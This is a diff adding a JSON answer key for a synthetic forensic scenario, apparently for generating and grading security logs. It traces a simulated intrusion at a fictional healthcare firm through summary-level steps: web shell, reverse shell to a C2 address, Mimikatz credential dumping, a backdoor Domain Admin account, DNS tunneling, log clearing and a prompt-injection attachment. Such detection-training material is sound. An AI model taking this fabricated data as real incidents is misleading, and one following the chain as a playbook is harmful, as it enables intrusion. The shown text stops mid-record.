@@ -1,0 +1,3151 @@
+{
+  "schema_version": 1,
+  "scenario_name": "iteration-test-expanded",
+  "scenario_description": "Expanded EvidenceForge iteration-test scenario for fast generate/evaluate/fix cycles.\nMeridian Healthcare Solutions is a mid-size healthcare IT company providing EHR\nintegration services from a corporate HQ with an on-premises data center. The\nstoryline compresses an APT-style web-app intrusion, Linux and Windows lateral\nmovement, credential theft, domain compromise, C2, DNS tunneling, data staging,\nexfiltration, email abuse, and cleanup into a 6-hour collection window while\npreserving broad event-type and log-format coverage. This expanded variant adds\nexplicit on-prem email topology, SMTP routing, corpus-backed message bodies,\nMIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay\negress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,\nand deterministic background email traffic.\n",
+  "generated_at": "2024-03-18T12:00:00Z",
+  "observation_profile": "enterprise_standard",
+  "collection_window": {
+    "start": "2024-03-18T12:00:00Z",
+    "end": "2024-03-18T18:00:00Z"
+  },
+  "source_evidence_status": {
+    "evt-001": {
+      "asa": {
+        "delayed": 6
+      },
+      "ecar": {
+        "delayed": 2
+      },
+      "zeek": {
+        "delayed": 5,
+        "filtered": 4
+      }
+    },
+    "evt-002": {
+      "asa": {
+        "delayed": 350,
+        "dropped": 2,
+        "filtered": 1,
+        "visible": 3
+      },
+      "ecar": {
+        "delayed": 352,
+        "dropped": 4
+      },
+      "ids": {
+        "delayed": 13
+      },
+      "web": {
+        "delayed": 307
+      },
+      "zeek": {
+        "delayed": 493,
+        "dropped": 2,
+        "filtered": 2,
+        "visible": 167
+      }
+    },
+    "evt-003": {
+      "syslog": {
+        "delayed": 3
+      },
+      "zeek": {
+        "delayed": 2
+      }
+    },
+    "evt-004": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 2
+      },
+      "web": {
+        "delayed": 2
+      },
+      "zeek": {
+        "delayed": 4
+      }
+    },
+    "evt-005": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 3,
+        "dropped": 1
+      },
+      "syslog": {
+        "visible": 1
+      },
+      "web": {
+        "delayed": 1
+      },
+      "zeek": {
+        "visible": 3
+      }
+    },
+    "evt-006": {
+      "asa": {
+        "delayed": 31
+      },
+      "bash_history": {
+        "visible": 7
+      },
+      "ecar": {
+        "delayed": 52
+      },
+      "syslog": {
+        "delayed": 9
+      },
+      "windows_security": {
+        "delayed": 2
+      },
+      "zeek": {
+        "delayed": 26,
+        "visible": 5
+      }
+    },
+    "evt-007": {
+      "bash_history": {
+        "visible": 3
+      },
+      "ecar": {
+        "delayed": 6
+      }
+    },
+    "evt-008": {
+      "asa": {
+        "delayed": 5,
+        "filtered": 1
+      },
+      "bash_history": {
+        "visible": 1
+      },
+      "ecar": {
+        "delayed": 10
+      },
+      "syslog": {
+        "delayed": 4
+      },
+      "windows_security": {
+        "delayed": 4
+      },
+      "zeek": {
+        "delayed": 2,
+        "visible": 8
+      }
+    },
+    "evt-009": {
+      "bash_history": {
+        "visible": 2
+      },
+      "ecar": {
+        "delayed": 4
+      }
+    },
+    "evt-010": {
+      "ecar": {
+        "delayed": 1
+      },
+      "sysmon": {
+        "delayed": 1
+      },
+      "windows_security": {
+        "delayed": 2
+      }
+    },
+    "evt-011": {
+      "ecar": {
+        "delayed": 1
+      },
+      "syslog": {
+        "delayed": 1
+      },
+      "windows_security": {
+        "delayed": 1
+      }
+    },
+    "evt-012": {
+      "asa": {
+        "delayed": 2,
+        "filtered": 5
+      },
+      "ecar": {
+        "delayed": 12
+      },
+      "sysmon": {
+        "delayed": 2
+      },
+      "windows_security": {
+        "delayed": 20
+      },
+      "zeek": {
+        "delayed": 8
+      }
+    },
+    "evt-013": {
+      "asa": {
+        "delayed": 2,
+        "filtered": 1
+      },
+      "ecar": {
+        "delayed": 16
+      },
+      "sysmon": {
+        "delayed": 14
+      },
+      "windows_security": {
+        "delayed": 17
+      },
+      "zeek": {
+        "delayed": 4
+      }
+    },
+    "evt-014": {
+      "ecar": {
+        "delayed": 5
+      },
+      "sysmon": {
+        "delayed": 5
+      },
+      "windows_security": {
+        "delayed": 2
+      }
+    },
+    "evt-015": {
+      "asa": {
+        "delayed": 3
+      },
+      "ecar": {
+        "delayed": 11
+      },
+      "sysmon": {
+        "delayed": 9
+      },
+      "windows_security": {
+        "delayed": 11
+      },
+      "zeek": {
+        "delayed": 4
+      }
+    },
+    "evt-016": {
+      "ecar": {
+        "delayed": 7
+      },
+      "sysmon": {
+        "delayed": 7
+      },
+      "windows_security": {
+        "delayed": 10
+      }
+    },
+    "evt-017": {
+      "asa": {
+        "filtered": 2
+      },
+      "ecar": {
+        "delayed": 13
+      },
+      "sysmon": {
+        "delayed": 12
+      },
+      "windows_security": {
+        "delayed": 11
+      },
+      "zeek": {
+        "delayed": 3
+      }
+    },
+    "evt-018": {
+      "asa": {
+        "delayed": 45
+      },
+      "ecar": {
+        "delayed": 47
+      },
+      "proxy": {
+        "delayed": 10
+      },
+      "sysmon": {
+        "delayed": 12
+      },
+      "windows_security": {
+        "delayed": 35
+      },
+      "zeek": {
+        "delayed": 72,
+        "visible": 34
+      }
+    },
+    "evt-019": {
+      "asa": {
+        "delayed": 4
+      },
+      "ecar": {
+        "delayed": 5
+      },
+      "proxy": {
+        "delayed": 4
+      },
+      "sysmon": {
+        "delayed": 5
+      },
+      "windows_security": {
+        "delayed": 5
+      },
+      "zeek": {
+        "delayed": 8
+      }
+    },
+    "evt-020": {
+      "asa": {
+        "delayed": 23,
+        "filtered": 238
+      },
+      "ecar": {
+        "delayed": 259,
+        "dropped": 2
+      },
+      "sysmon": {
+        "delayed": 22
+      },
+      "windows_security": {
+        "delayed": 280
+      },
+      "zeek": {
+        "delayed": 376,
+        "filtered": 6,
+        "visible": 140
+      }
+    },
+    "evt-021": {
+      "asa": {
+        "delayed": 89,
+        "dropped": 1,
+        "visible": 1
+      },
+      "ecar": {
+        "delayed": 91
+      },
+      "windows_security": {
+        "delayed": 91
+      },
+      "zeek": {
+        "delayed": 136,
+        "visible": 46
+      }
+    },
+    "evt-022": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 9
+      },
+      "sysmon": {
+        "delayed": 8
+      },
+      "windows_security": {
+        "delayed": 12
+      },
+      "zeek": {
+        "delayed": 2
+      }
+    },
+    "evt-023": {
+      "asa": {
+        "filtered": 6
+      },
+      "bash_history": {
+        "visible": 11
+      },
+      "ecar": {
+        "delayed": 41
+      },
+      "syslog": {
+        "delayed": 10
+      },
+      "windows_security": {
+        "delayed": 4
+      },
+      "zeek": {
+        "delayed": 6,
+        "visible": 4
+      }
+    },
+    "evt-024": {
+      "windows_security": {
+        "delayed": 1
+      }
+    },
+    "evt-025": {
+      "asa": {
+        "delayed": 5
+      },
+      "ecar": {
+        "delayed": 11,
+        "dropped": 2
+      },
+      "proxy": {
+        "delayed": 1
+      },
+      "sysmon": {
+        "delayed": 6,
+        "dropped": 1
+      },
+      "windows_security": {
+        "delayed": 10
+      },
+      "zeek": {
+        "delayed": 6,
+        "visible": 4
+      }
+    },
+    "evt-026": {
+      "asa": {
+        "delayed": 5,
+        "filtered": 3,
+        "visible": 1
+      },
+      "ecar": {
+        "delayed": 10
+      },
+      "proxy": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 3
+      },
+      "zeek": {
+        "delayed": 18,
+        "visible": 6
+      }
+    },
+    "evt-027": {
+      "ecar": {
+        "delayed": 1
+      },
+      "windows_security": {
+        "delayed": 2
+      }
+    },
+    "evt-028": {
+      "asa": {
+        "delayed": 2
+      },
+      "bash_history": {
+        "visible": 1
+      },
+      "ecar": {
+        "delayed": 9
+      },
+      "syslog": {
+        "delayed": 4
+      },
+      "sysmon": {
+        "delayed": 4
+      },
+      "windows_security": {
+        "delayed": 4
+      },
+      "zeek": {
+        "visible": 3
+      }
+    },
+    "evt-029": {
+      "asa": {
+        "delayed": 1
+      },
+      "bash_history": {
+        "visible": 1
+      },
+      "ecar": {
+        "delayed": 8
+      },
+      "syslog": {
+        "delayed": 4
+      },
+      "sysmon": {
+        "delayed": 2
+      },
+      "windows_security": {
+        "delayed": 2
+      },
+      "zeek": {
+        "visible": 1
+      }
+    },
+    "evt-030": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 6,
+        "dropped": 1
+      },
+      "proxy": {
+        "delayed": 1
+      },
+      "sysmon": {
+        "delayed": 6
+      },
+      "windows_security": {
+        "delayed": 7
+      },
+      "zeek": {
+        "delayed": 4
+      }
+    },
+    "evt-031": {
+      "asa": {
+        "filtered": 3
+      },
+      "ecar": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 3
+      },
+      "zeek": {
+        "delayed": 2,
+        "visible": 4
+      }
+    },
+    "evt-032": {
+      "ecar": {
+        "delayed": 3
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 4
+      }
+    },
+    "evt-033": {
+      "ecar": {
+        "delayed": 1
+      },
+      "windows_security": {
+        "delayed": 1
+      }
+    },
+    "evt-034": {
+      "ecar": {
+        "delayed": 1
+      },
+      "windows_security": {
+        "delayed": 1
+      }
+    },
+    "evt-035": {
+      "ecar": {
+        "delayed": 1
+      },
+      "syslog": {
+        "delayed": 2
+      }
+    },
+    "evt-email-001": {
+      "asa": {
+        "delayed": 12,
+        "filtered": 3
+      },
+      "ecar": {
+        "delayed": 23
+      },
+      "proxy": {
+        "delayed": 2
+      },
+      "syslog": {
+        "delayed": 10
+      },
+      "sysmon": {
+        "delayed": 11
+      },
+      "windows_security": {
+        "delayed": 15
+      },
+      "zeek": {
+        "delayed": 22,
+        "visible": 10
+      }
+    },
+    "evt-email-002": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 4
+      },
+      "proxy": {
+        "delayed": 1
+      },
+      "sysmon": {
+        "delayed": 3
+      },
+      "windows_security": {
+        "delayed": 2
+      },
+      "zeek": {
+        "delayed": 4
+      }
+    },
+    "evt-email-003": {
+      "asa": {
+        "delayed": 6,
+        "filtered": 3
+      },
+      "ecar": {
+        "delayed": 12
+      },
+      "syslog": {
+        "delayed": 11,
+        "dropped": 1
+      },
+      "sysmon": {
+        "delayed": 12
+      },
+      "windows_security": {
+        "delayed": 16
+      },
+      "zeek": {
+        "delayed": 18,
+        "visible": 4
+      }
+    },
+    "evt-email-004": {
+      "asa": {
+        "delayed": 11,
+        "filtered": 3
+      },
+      "ecar": {
+        "delayed": 24
+      },
+      "proxy": {
+        "delayed": 1
+      },
+      "syslog": {
+        "delayed": 19,
+        "dropped": 1
+      },
+      "sysmon": {
+        "delayed": 1
+      },
+      "windows_security": {
+        "delayed": 8
+      },
+      "zeek": {
+        "delayed": 28,
+        "visible": 10
+      }
+    },
+    "evt-email-005": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 5
+      },
+      "syslog": {
+        "delayed": 2
+      },
+      "windows_security": {
+        "delayed": 1
+      },
+      "zeek": {
+        "delayed": 6
+      }
+    },
+    "evt-email-006": {
+      "asa": {
+        "delayed": 3
+      },
+      "ecar": {
+        "delayed": 3
+      },
+      "syslog": {
+        "delayed": 8
+      },
+      "sysmon": {
+        "delayed": 2
+      },
+      "windows_security": {
+        "delayed": 2
+      },
+      "zeek": {
+        "delayed": 9
+      }
+    },
+    "evt-email-007": {
+      "asa": {
+        "delayed": 6,
+        "filtered": 1
+      },
+      "ecar": {
+        "delayed": 12
+      },
+      "syslog": {
+        "delayed": 9
+      },
+      "windows_security": {
+        "delayed": 4
+      },
+      "zeek": {
+        "delayed": 18,
+        "visible": 2
+      }
+    },
+    "evt-email-008": {
+      "asa": {
+        "delayed": 10,
+        "filtered": 2
+      },
+      "ecar": {
+        "delayed": 19
+      },
+      "proxy": {
+        "delayed": 2
+      },
+      "syslog": {
+        "delayed": 11
+      },
+      "sysmon": {
+        "delayed": 11
+      },
+      "windows_security": {
+        "delayed": 11
+      },
+      "zeek": {
+        "delayed": 24,
+        "visible": 4
+      }
+    },
+    "evt-email-009": {
+      "asa": {
+        "delayed": 1
+      },
+      "ecar": {
+        "delayed": 1
+      },
+      "syslog": {
+        "delayed": 2
+      },
+      "sysmon": {
+        "delayed": 1
+      },
+      "windows_security": {
+        "delayed": 1
+      },
+      "zeek": {
+        "delayed": 2
+      }
+    },
+    "evt-email-010": {
+      "asa": {
+        "delayed": 1
+      },
+      "ecar": {
+        "delayed": 1
+      },
+      "syslog": {
+        "delayed": 2
+      },
+      "zeek": {
+        "delayed": 5
+      }
+    },
+    "evt-email-011": {
+      "asa": {
+        "delayed": 11,
+        "filtered": 3,
+        "visible": 1
+      },
+      "ecar": {
+        "delayed": 20
+      },
+      "proxy": {
+        "delayed": 1
+      },
+      "syslog": {
+        "delayed": 9
+      },
+      "sysmon": {
+        "delayed": 12
+      },
+      "windows_security": {
+        "delayed": 18
+      },
+      "zeek": {
+        "delayed": 35,
+        "visible": 2
+      }
+    },
+    "red_herring:rh-001": {
+      "ecar": {
+        "delayed": 4
+      },
+      "windows_security": {
+        "delayed": 4
+      }
+    },
+    "red_herring:rh-002": {
+      "asa": {
+        "delayed": 2
+      },
+      "ecar": {
+        "delayed": 11
+      },
+      "sysmon": {
+        "delayed": 10
+      },
+      "windows_security": {
+        "delayed": 10
+      },
+      "zeek": {
+        "visible": 3
+      }
+    }
+  },
+  "storyline_steps": [
+    {
+      "storyline_id": "evt-email-001",
+      "index": 0,
+      "actor": "diego.ramirez",
+      "system": "WS-DRAMIREZ-01",
+      "activity": "External benefits-themed phishing message is delivered to Finance with hidden security Bcc",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-002",
+      "index": 1,
+      "actor": "diego.ramirez",
+      "system": "WS-DRAMIREZ-01",
+      "activity": "Finance user reads the suspicious benefits message through OWA",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_read"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-003",
+      "index": 2,
+      "actor": "diego.ramirez",
+      "system": "WS-DRAMIREZ-01",
+      "activity": "Diego forwards the suspicious message to the help desk and discreetly copies security",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-001",
+      "index": 3,
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "External attacker scans the DMZ for exposed services",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "port_scan"
+      ]
+    },
+    {
+      "storyline_id": "evt-002",
+      "index": 4,
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "External attacker runs Nikto web vulnerability scanning against the EHR portal",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "web_scan"
+      ]
+    },
+    {
+      "storyline_id": "evt-003",
+      "index": 5,
+      "actor": "root",
+      "system": "LT-MRIVERA-02",
+      "activity": "Rogue laptop obtains an address from DHCP on the corporate LAN",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "dhcp_lease"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-004",
+      "index": 6,
+      "actor": "lina.nguyen",
+      "system": "WS-LNGUYEN-01",
+      "activity": "Engineering sends an internal EHR release note to a clinical operations distribution group",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-005",
+      "index": 7,
+      "actor": "omar.haddad",
+      "system": "WS-OHADDAD-01",
+      "activity": "Analytics user reads the EHR release note through IMAPS",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_read"
+      ]
+    },
+    {
+      "storyline_id": "evt-004",
+      "index": 8,
+      "actor": "apache",
+      "system": "WEB-EXT-01",
+      "activity": "SQL injection probes against the EHR portal produce server errors",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection"
+      ]
+    },
+    {
+      "storyline_id": "evt-005",
+      "index": 9,
+      "actor": "apache",
+      "system": "WEB-EXT-01",
+      "activity": "Web shell upload and reverse shell callback to direct-IP C2",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection",
+        "process",
+        "raw"
+      ]
+    },
+    {
+      "storyline_id": "evt-006",
+      "index": 10,
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Network and host discovery from the compromised web server",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-006",
+      "index": 11,
+      "actor": "priya.patel",
+      "system": "WS-PPATEL-01",
+      "activity": "A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-007",
+      "index": 12,
+      "actor": "lina.nguyen",
+      "system": "WS-LNGUYEN-01",
+      "activity": "Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-007",
+      "index": 13,
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Harvest database credentials and SSH key material from the web server",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-008",
+      "index": 14,
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection",
+        "ssh_session"
+      ]
+    },
+    {
+      "storyline_id": "evt-009",
+      "index": 15,
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Dump Linux password databases from APP-INT-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-010",
+      "index": 16,
+      "actor": "marcus.chen",
+      "system": "WS-MCHEN-01",
+      "activity": "Attacker uses explicit sysadmin credentials through RunAs",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "explicit_credentials"
+      ]
+    },
+    {
+      "storyline_id": "evt-011",
+      "index": 17,
+      "actor": "root",
+      "system": "LT-MRIVERA-02",
+      "activity": "Wrong-password fumble before broader credential spray",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "failed_logon"
+      ]
+    },
+    {
+      "storyline_id": "evt-012",
+      "index": 18,
+      "actor": "root",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Credential spray succeeds against help desk user followed by RDP session",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "credential_spray",
+        "rdp_session"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-008",
+      "index": 19,
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Compromised help desk mailbox sends an internal credential-reset lure to finance",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-009",
+      "index": 20,
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Attacker reads the compromised help desk mailbox through IMAPS",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_read"
+      ]
+    },
+    {
+      "storyline_id": "evt-013",
+      "index": 21,
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Active Directory enumeration from compromised workstation",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection",
+        "dns_query",
+        "logon",
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-014",
+      "index": 22,
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Credential dumping with Mimikatz disguised as a Windows indexing service",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "create_remote_thread",
+        "process",
+        "process_access"
+      ]
+    },
+    {
+      "storyline_id": "evt-015",
+      "index": 23,
+      "actor": "aisha.johnson",
+      "system": "DC-01",
+      "activity": "PsExec-style lateral movement to DC-01 through SMB service creation",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "logon",
+        "process",
+        "service_installed"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-010",
+      "index": 24,
+      "actor": "evelyn.brooks",
+      "system": "WS-EBROOKS-01",
+      "activity": "External invoice-themed attachment is rejected by the mail gateway",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-016",
+      "index": 25,
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Create backdoor account and add it to Domain Admins",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "account_created",
+        "group_member_added",
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-017",
+      "index": 26,
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Install service and scheduled task persistence on DC-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process",
+        "scheduled_task_created",
+        "service_installed"
+      ]
+    },
+    {
+      "storyline_id": "evt-018",
+      "index": 27,
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Allowed HTTPS beacon from DC-01 to attacker infrastructure",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "beacon"
+      ]
+    },
+    {
+      "storyline_id": "evt-019",
+      "index": 28,
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Direct C2 beacon attempts from DC-01 are blocked by firewall",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "beacon"
+      ]
+    },
+    {
+      "storyline_id": "evt-020",
+      "index": 29,
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "DNS tunneling exfiltration from APP-INT-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "dns_tunnel"
+      ]
+    },
+    {
+      "storyline_id": "evt-email-011",
+      "index": 30,
+      "actor": "evelyn.brooks",
+      "system": "WS-EBROOKS-01",
+      "activity": "Executive sends an inline-authored operating note to an outside advisor with internal Bcc",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "email_message"
+      ]
+    },
+    {
+      "storyline_id": "evt-021",
+      "index": 31,
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "DGA queries from compromised web server",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "dga_queries"
+      ]
+    },
+    {
+      "storyline_id": "evt-022",
+      "index": 32,
+      "actor": "svc_mhsync",
+      "system": "FILE-SRV-01",
+      "activity": "Backdoor account authenticates to FILE-SRV-01 and stages sensitive data",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "logon",
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-023",
+      "index": 33,
+      "actor": "root",
+      "system": "DB-PROD-01",
+      "activity": "SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process",
+        "ssh_session"
+      ]
+    },
+    {
+      "storyline_id": "evt-024",
+      "index": 34,
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Attacker locks compromised workstation before stepping away",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "workstation_lock"
+      ]
+    },
+    {
+      "storyline_id": "evt-025",
+      "index": 35,
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Upload compressed archive to external staging domain over HTTPS",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "connection"
+      ]
+    },
+    {
+      "storyline_id": "evt-026",
+      "index": 36,
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Ongoing periodic beacon from WEB-EXT-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "beacon"
+      ]
+    },
+    {
+      "storyline_id": "evt-027",
+      "index": 37,
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Attacker returns and unlocks compromised workstation",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "workstation_unlock"
+      ]
+    },
+    {
+      "storyline_id": "evt-028",
+      "index": 38,
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Clear Linux shell history on WEB-EXT-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-029",
+      "index": 39,
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Clear Linux shell history on APP-INT-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-030",
+      "index": 40,
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Encoded PowerShell download and Security log clearing on DC-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "log_cleared",
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-031",
+      "index": 41,
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Standalone DNS queries for attacker infrastructure",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "dns_query"
+      ]
+    },
+    {
+      "storyline_id": "evt-032",
+      "index": 42,
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Delete backdoor account after exfiltration",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "account_deleted",
+        "process"
+      ]
+    },
+    {
+      "storyline_id": "evt-033",
+      "index": 43,
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Attacker logs off compromised help desk workstation",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "logoff"
+      ]
+    },
+    {
+      "storyline_id": "evt-034",
+      "index": 44,
+      "actor": "svc_mhsync",
+      "system": "FILE-SRV-01",
+      "activity": "Backdoor account session logs off FILE-SRV-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "logoff"
+      ]
+    },
+    {
+      "storyline_id": "evt-035",
+      "index": 45,
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Root SSH session logs off APP-INT-01",
+      "ground_truth_section": "storyline",
+      "event_types": [
+        "logoff"
+      ]
+    }
+  ],
+  "red_herring_steps": [
+    {
+      "storyline_id": "rh-001",
+      "index": 0,
+      "actor": "sophia.martinez",
+      "system": "WS-SMARTINEZ-01",
+      "activity": "Sales user mistypes password several times before a normal logon",
+      "ground_truth_section": "red_herring",
+      "event_types": [
+        "failed_logon",
+        "logon"
+      ],
+      "explanation": "Sophia had recently changed her password and mistyped it before succeeding; this mimics a lockout-pattern alert without attacker involvement."
+    },
+    {
+      "storyline_id": "rh-002",
+      "index": 1,
+      "actor": "marcus.chen",
+      "system": "DC-01",
+      "activity": "Sysadmin performs after-hours RDP maintenance and diagnostics on DC-01",
+      "ground_truth_section": "red_herring",
+      "event_types": [
+        "process",
+        "rdp_session"
+      ],
+      "explanation": "Marcus was investigating a help desk ticket after normal business hours; the commands are legitimate diagnostics."
+    }
+  ],
+  "events": [
+    {
+      "record_id": "evt-001#0",
+      "kind": "port_scan",
+      "storyline_id": "evt-001",
+      "time": "2024-03-18T12:30:12Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "External attacker scans the DMZ for exposed services",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "ports": [
+          22,
+          80,
+          443,
+          8080,
+          8443,
+          3306
+        ],
+        "protocol": "tcp",
+        "target_count": 1,
+        "total_connections": 6
+      }
+    },
+    {
+      "record_id": "evt-002#0",
+      "kind": "web_scan",
+      "storyline_id": "evt-002",
+      "time": "2024-03-18T12:31:18Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "External attacker runs Nikto web vulnerability scanning against the EHR portal",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.10.3.10",
+        "dst_port": 443,
+        "preset": "nikto",
+        "request_count": 356
+      }
+    },
+    {
+      "record_id": "evt-003#0",
+      "kind": "dhcp_lease",
+      "storyline_id": "evt-003",
+      "time": "2024-03-18T12:44:40Z",
+      "actor": "root",
+      "system": "LT-MRIVERA-02",
+      "activity": "Rogue laptop obtains an address from DHCP on the corporate LAN",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "mac_address": "DC:A6:32:44:91:7B"
+      }
+    },
+    {
+      "record_id": "evt-004#0",
+      "kind": "connection",
+      "storyline_id": "evt-004",
+      "time": "2024-03-18T13:00:06Z",
+      "actor": "apache",
+      "system": "WEB-EXT-01",
+      "activity": "SQL injection probes against the EHR portal produce server errors",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "203.14.220.10",
+        "dst_port": 443,
+        "uid": "Cf5CCeU5Wn3slmRfrx"
+      }
+    },
+    {
+      "record_id": "evt-004#1",
+      "kind": "connection",
+      "storyline_id": "evt-004",
+      "time": "2024-03-18T13:00:09Z",
+      "actor": "apache",
+      "system": "WEB-EXT-01",
+      "activity": "SQL injection probes against the EHR portal produce server errors",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "203.14.220.10",
+        "dst_port": 443,
+        "uid": "CgigRBmtKVaiQBxLs6"
+      }
+    },
+    {
+      "record_id": "evt-005#0",
+      "kind": "connection",
+      "storyline_id": "evt-005",
+      "time": "2024-03-18T13:20:10Z",
+      "actor": "apache",
+      "system": "WEB-EXT-01",
+      "activity": "Web shell upload and reverse shell callback to direct-IP C2",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "203.14.220.10",
+        "dst_port": 443,
+        "uid": "COigTtuqz1PJblEyw"
+      }
+    },
+    {
+      "record_id": "evt-005#1",
+      "kind": "process",
+      "storyline_id": "evt-005",
+      "time": "2024-03-18T13:20:11Z",
+      "actor": "apache",
+      "system": "WEB-EXT-01",
+      "activity": "Web shell upload and reverse shell callback to direct-IP C2",
